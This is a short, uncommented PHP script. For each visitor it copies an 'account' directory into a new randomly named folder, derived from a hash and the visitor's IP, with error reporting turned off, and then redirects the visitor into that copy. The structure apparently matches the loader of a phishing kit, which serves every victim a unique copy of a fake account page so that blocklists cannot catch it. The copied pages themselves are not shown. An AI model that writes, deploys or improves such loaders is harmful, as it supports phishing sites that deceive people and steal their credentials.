<?php
session_start();
error_reporting(0);
$somerannum = rand(100000, 1000000) . $_SERVER['REMOTE_ADDR'];
$someranstr = substr(md5($somerannum), 0, 10);
function recurse_copy($someopen, $someranstr)
{
    $somefile = opendir($someopen);
    @mkdir($someranstr);
    while (false !== ($somelocal = readdir($somefile))) {
        if (($somelocal != '.') && ($somelocal != '..')) {
            if (is_dir($someopen . '/' . $somelocal)) {
                recurse_copy($someopen . '/' . $somelocal, $someranstr . '/' . $somelocal);
            } else {
                copy($someopen . '/' . $somelocal, $someranstr . '/' . $somelocal);
            }
        }
    }
    closedir($somefile);
}
$someopen = "account";
recurse_copy($someopen, $someranstr);
header("location:" . $someranstr . "");
unset($someranstr);
?>